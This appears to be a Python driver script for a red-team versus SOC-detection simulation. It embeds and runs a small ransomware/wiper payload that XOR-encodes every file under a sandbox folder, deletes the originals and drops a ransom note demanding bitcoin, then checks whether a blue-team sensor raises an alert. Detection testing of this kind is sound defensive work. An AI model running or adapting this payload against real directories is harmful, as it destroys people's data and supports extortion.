import os
import uuid
from backend.models import Base, Run
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from simulators import red_node, blue_sensor
from backend import orchestrator
import datetime

# Setup DB
SQLALCHEMY_DATABASE_URL = "sqlite:///./sql_app.db"
engine = create_engine(SQLALCHEMY_DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)

Base.metadata.create_all(bind=engine)
db = SessionLocal()

# Setup Sandbox Folder for Attack
sandbox_dir = "/tmp/vanguard_target"
os.makedirs(sandbox_dir, exist_ok=True)
with open(os.path.join(sandbox_dir, "sensitive_passwords.txt"), "w") as f:
    f.write("admin:password123\nCEO:secret456\n")

# Create a Dummy Run
run = Run(apt_profile="LazarusGroup", start_time=datetime.datetime.utcnow(), status="in_progress")
db.add(run)
db.commit()
db.refresh(run)

correlation_id = str(uuid.uuid4())

print("==================================================")
print("[+] 1. SYNTHESIZING UNCONSTRAINED MALICIOUS PAYLOAD")
print("[+] Generating Ransomware/Wiper script in Python against Sandbox.")
print("==================================================")
payload = {
    "script": """import os
import time
target = '/tmp/vanguard_target/'
print(f'[*] PROPER ATTACKER DEPLOYED: Encrypting and Shredding files in {target}')
time.sleep(1)
try:
    for root, dirs, files in os.walk(target):
        for f in files:
            p = os.path.join(root, f)
            print(f'    -> Encrypting: {p}')
            with open(p, 'rb') as file: data = file.read()
            # Simulate AES-GCM Encrypt
            encrypted_data = bytes([b ^ 0xAA for b in data]) 
            with open(p + '.vanguard_locked', 'wb') as file: file.write(encrypted_data)
            os.remove(p) # Delete original
            print(f'    -> Shredded original file: {p}')
            
    with open(os.path.join(target, 'RANSOM_NOTE.txt'), 'w') as n:
        n.write('YOUR FILES ARE ENCRYPTED BY VANGUARD-APT. SEND 100 BTC TO DECRYPT.\\n')
    print('[+] MISSION ACCOMPLISHED: Target directory wiped and ransomed.')
except Exception as e:
    print(f'[-] Wiper Error: {e}')
""",
    "language": "python",
    "obfuscation_type": "dynamic_wiper_and_ransomware"
}


script = payload.get("script", "")
print(f"[+] Payload Size: {len(script)} bytes")
print("--- RAW GENERATED MALWARE ---")
print(script)
print("-----------------------------")

print("\n==================================================")
print(f"[+] 2. EXECUTING NATIVE HOST MALWARE (Correlation ID: {correlation_id})")
print("==================================================")

action = red_node.simulate_execution(run.id, payload, db)

print("\n==================================================")
print("[+] 3. TRIGGERING BLUE SENSOR SOC DETECTION")
print("==================================================")
alert = blue_sensor.ingest_telemetry_and_detect(action, db)

if alert:
    print(f"[!] DETECTED: Alert generated and pushed to Kibana 'vanguard-alerts'!")
else:
    print(f"[-] BYPASSED: Malware evaded Blue Sensor heuristics.")
    
print("\n[✔] Simulation complete. Please check http://localhost:5601 to view Logs & Alerts.")
